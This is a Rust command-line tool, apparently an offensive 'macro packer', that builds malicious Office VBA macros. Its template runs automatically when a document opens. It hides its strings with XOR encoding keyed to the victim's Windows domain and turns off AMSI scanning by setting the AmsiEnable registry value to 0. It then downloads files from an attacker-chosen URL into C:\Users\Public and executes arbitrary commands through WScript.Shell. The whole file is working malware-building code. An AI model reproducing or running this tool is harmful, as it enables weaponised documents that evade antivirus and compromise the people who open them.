use std::collections::HashMap;
use base64::{Engine as _, engine::general_purpose};
use clap::Parser;

const TEMPLATE: &str = r#"Function Pears(Beets, Mango)
    Pears = Chr((Beets Xor Mango) - 17)
End Function
Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function
Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function
Function Nuts(Milk)
    Dim Mango As String
    Mango = GetDomainName()
    Banana = Lemon(Mango)
    Dim X As Long
    Dim Berry As Long
    X = 0
    Do
    Berry = Banana(X)
    X = X + 1
    X = X Mod UBound(Banana)
    
    Oatmilk = Oatmilk + Pears(Strawberries(Milk), Berry)
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function
Function GetDomainName()
    Set wshNetwork = CreateObject("WScript.Network")
    GetDomainName = UCase(wshNetwork.UserDomain)
End Function
Function Lemon(TextInput)
    Dim abData() As Integer, X As Long
    X = 0
    ReDim Preserve abData(X)
    Do
    abData(X) = Asc(TextInput)
    TextInput = Right(TextInput, Len(TextInput) - 1)
    X = X + 1
    ReDim Preserve abData(0 To X)
    Loop While Len(TextInput) > 0
    Lemon = abData
End Function
Function DownloadFile(FileD)
    Dim myURL As String
    myURL = Nuts("{baseHttpUrl}") & FileD
    
    Dim WinHttpReq As Object
    Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
    WinHttpReq.Open "GET", myURL, False
    WinHttpReq.send
    
    If WinHttpReq.Status = 200 Then
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1
        oStream.Write WinHttpReq.responseBody
        oStream.SaveToFile Nuts("{fileDownloadPath}") & FileD, 2 ' 1 = no overwrite, 2 = overwrite
        oStream.Close
    End If
End Function
Function Run(C)
    paperino = Nuts("{amsiEnable}")
    Set pippo = GetObject(Nuts("{regClsId}"))
    E = 0
    On Error Resume Next
    r = pippo.RegRead(paperino)
    If r <> 0 Then
        pippo.RegWrite paperino, "0", Nuts("{regDword}")
        E = 1
    End If
    If Err.Number <> 0 Then
        pippo.RegWrite paperino, "0", Nuts("{regDword}")
        E = 1
    Err.Clear
    End If
    
    Set minnie = CreateObject(Nuts("{wscriptShell}"))
    minnie.Exec(Nuts(C))
    On Error GoTo 0
End Function
Sub MyMacro()
{commands}
End Sub
Sub TestVersion()
   Dim intVersion    As Integer
   #If Win64 Then
      intVersion = 64
   #Else
      intVersion = 32
   #End If
   MsgBox "Your are running office versison = " & intVersion
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub AutoOpen()
    MyMacro
End Sub
"#;

fn build_vba(key: &str, DEFAULT_DICT: HashMap<&str,&str> , commands: Vec<&str>) -> String {

    let COMMANDS_TEMPLATES: HashMap<&str, &str> = HashMap::from([
        ("dwld", r#"DownloadFile(Nuts("{value}"))"#),
        ("exec", r#"Run("{value}")"#)
    ]);

    let mut s = String::from(TEMPLATE);

    s = s.replace("{fileDownloadPath}", &xor_encrypt(&key, &DEFAULT_DICT.get("fileDownloadPath").unwrap()));
    s = s.replace("{amsiEnable}", &xor_encrypt(&key,&DEFAULT_DICT.get("amsiEnable").unwrap()));
    s = s.replace("{regClsId}", &xor_encrypt(&key,&DEFAULT_DICT.get("regClsId").unwrap()));
    s = s.replace("{regDword}", &xor_encrypt(&key,&DEFAULT_DICT.get("regDword").unwrap()));
    s = s.replace("{wscriptShell}", &xor_encrypt(&key,&DEFAULT_DICT.get("wscriptShell").unwrap()));

    let mut cmds: Vec<String> = Vec::new();
    for cmd in commands {    
        let mut iter = cmd.splitn(2,":");
        let cmd_type = iter.next().unwrap();
        let cmd_value = xor_encrypt(&key, &iter.next().unwrap());
        cmds.push(COMMANDS_TEMPLATES.get(&cmd_type).unwrap().replace("{value}", &cmd_value));
    }

    s = s.replace("{commands}", &cmds.join("\n"));

    s
}

fn xor_encrypt(key: &str, plaintext: &str) -> String {
    let key_bytes = key.as_bytes();
    let plaintext_bytes = plaintext.as_bytes();

    let mut ciphertext = Vec::new();

    for (i, &byte) in plaintext_bytes.iter().enumerate() {
        let key_byte = key_bytes[i % key_bytes.len()];
        let encrypted_byte = (byte + 17) ^ key_byte;
        ciphertext.push(encrypted_byte);
    }
    general_purpose::STANDARD_NO_PAD.encode(ciphertext)
}

fn xor_decrypt(key: &str, ciphertext: &str) -> String {
    let key_bytes = key.as_bytes();
    let ciphertext_bytes = general_purpose::STANDARD_NO_PAD.decode(ciphertext).unwrap();

    let mut plaintext = Vec::new();

    for (i, &byte) in ciphertext_bytes.iter().enumerate() {
        let key_byte = key_bytes[i % key_bytes.len()];
        let decrypted_byte = (byte ^ key_byte) - 17;
        plaintext.push(decrypted_byte);
    }

    String::from_utf8(plaintext).expect("Invalid UTF-8 string")
}

#[derive(Parser, Debug)]
#[clap(author="Marco Strambelli", version="0.9", about="A macro packer")]
struct Args {
    #[clap(short, long)]
    key: String,
    #[clap(short, long)]
    base_http: String,
    #[clap(short, long)]
    commands: String,
    #[clap(short, long)]
    path: Option<String>
}

fn main() {
    let mut DEFAULT_DICT = HashMap::from([
        ("baseHttpUrl", ""),
        ("fileDownloadPath", "C:\\Users\\Public\\"),
        ("amsiEnable", "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable"),
        ("regClsId", "new:72C24DD5-D70A-438B-8A42-98424B88AFB8"),
        ("regDword", "REG_DWORD"),
        ("wscriptShell", "WScript.Shell"),
        ("commands", ""),
        ("key", "")
    ]);

    let args = Args::parse();

    let plaintext = "Hello, world!";
    let ciphertext = xor_encrypt(&args.key, plaintext);
    let decrypted_plaintext = xor_decrypt(&args.key, &ciphertext);
    assert_eq!(plaintext, decrypted_plaintext);

    DEFAULT_DICT.insert("key", &args.key);
    DEFAULT_DICT.insert("baseHttpUrl", &args.base_http);

    let commands: Vec<&str> = args.commands.split(',').collect();

    let vba = build_vba(&args.key, DEFAULT_DICT, commands);

    println!("{:}", vba)
}